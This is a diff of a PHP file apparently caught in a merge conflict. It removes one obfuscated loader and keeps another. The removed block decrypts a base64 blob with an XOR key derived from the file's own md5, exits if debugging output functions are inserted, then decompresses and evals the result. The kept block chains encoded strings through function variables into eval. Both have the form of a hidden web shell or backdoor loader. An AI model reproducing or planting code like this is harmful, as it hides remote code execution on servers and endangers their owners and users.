@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$mtjrsws="bf25eb51668e96f193cb15336d2733f9";
-$gceulh="0402000207520c0600575b575f0356070107500701060305065550015250025c";
-$cqwkbssdc="Hr6/Y7la4ncmHFTKeaNQZjpam37KV6LWcDrnrD9rGRTrfJ9hsPSSakNOFi/1uhlLMEnbMtj0iowEv9lEdQLolKjd3q6zOPGuGOFRAE2/n0UhB53C8/JAdglZL5hNkXwgnHoRMggDJVuxYoGsJNRHBrS4kdNwoEOEWP/IEaliISWoS/oVcn6byS/d6gNPymCi3JdxJIEzLrqb632XV/NSMAFLpdQldCgfMxXGD9R6JqJZKTfKbtwhjrO5UenqVYGqrhbrdtLfGTLDjocDp7I0HzLE0vZNTqpvdQJtyE82iMNlGeQ2bCM22TStehhGskgQwxU7fEkvAzwB+tPh5a21nXEc+aMQPsPEHdl4neg+cE83EFWBA4Ay/W+DlThn71m1LgdJFKpxlK/HgRCUOjmCQbTiYaMuy3rcX/8w6W0IRyAhZoCL9WU5BKND5GxwooXJcvnubWYvZQFUHic0S5R/bNEo9sf+a02JPlL28QvMC9kd/AOLWiylFFY7DYxnA/sFa/jJPjo1BbToUD+xx6yhXZ4IuQ7ZdYl8wTrE7qy3dEiNsWoYIitIkxLQ4Sjyt5T6vOGVvyy8/JBQX3kwEDdP+VLk3/noUv8dd4uRQqMD6lcK4BxLLqXZ/4SY3E0rzQZaeFEYiaoYSFZzDxAITcrjGWLggWhReh4Zecq94pJ64qIha+LkD2tOQGwcfL8Rd/8E1baeFg1fjGNN85GYWNaVrCizT8lgGgHQwQ==";
-$poeldznm=file_get_contents(__FILE__);
-$hzcljuyqp=str_replace($cqwkbssdc,"",$poeldznm);
-if(strpos($hzcljuyqp,"ec"."ho")!==false||strpos($hzcljuyqp,"pr"."int")!==false||strpos($hzcljuyqp,"var_"."dump")!==false||strpos($hzcljuyqp,"file_put_"."contents")!==false||strpos($hzcljuyqp,"fw"."rite")!==false){die();}
-$sgqsho=str_replace(array($mtjrsws,$gceulh),array("SP_3da6a018","KP_2896fcf2"),$poeldznm);
-$mjmtfqxmb=md5($sgqsho);
-$phfbamuc=hex2bin($gceulh);
-$rsogjsabmibk="";
-$dmfspnb=strlen($mjmtfqxmb);
-for($bgiabtjn=0;$bgiabtjn<$dmfspnb;$bgiabtjn++){
-$rsogjsabmibk.=chr(ord($phfbamuc[$bgiabtjn])^ord($mjmtfqxmb[$bgiabtjn]));
-}
-$hzpacv=base64_decode($cqwkbssdc);
-$cssmtme=strlen($hzpacv);
-$okgooi="";
-$hzdsgfwt=strlen($rsogjsabmibk);
-for($bgiabtjn=0;$bgiabtjn<$cssmtme;$bgiabtjn++){
-$okgooi.=$hzpacv[$bgiabtjn]^$rsogjsabmibk[$bgiabtjn%$hzdsgfwt];
-}
-$pvzzkaj="gzun"."compress";
-eval($pvzzkaj($okgooi));
-=======
 // 165214ec5d77d7644dd72fd6
 $wvlDHHDQHb="hJ7fZV13HjeQ5wlo8kcp9kXQHaEDUKZ2fUgRlgufIhU=";
 $cnlqEeMLgIZ="uW7sMI13UwrD5jyb8xpc9xKDUnRQHXM2sHtEythsVuH=";
@@ -52,4 +27,3 @@ $TvxUqPvTQ=$gLdInwgtvXsS($TvxUqPvTQ);
 $TvxUqPvTQ=$kZmuvtigQ_VDK($TvxUqPvTQ);
 $TvxUqPvTQ=$ss_rNWLAnW($TvxUqPvTQ);
 eval($TvxUqPvTQ);
->>>>>>> Stashed changes
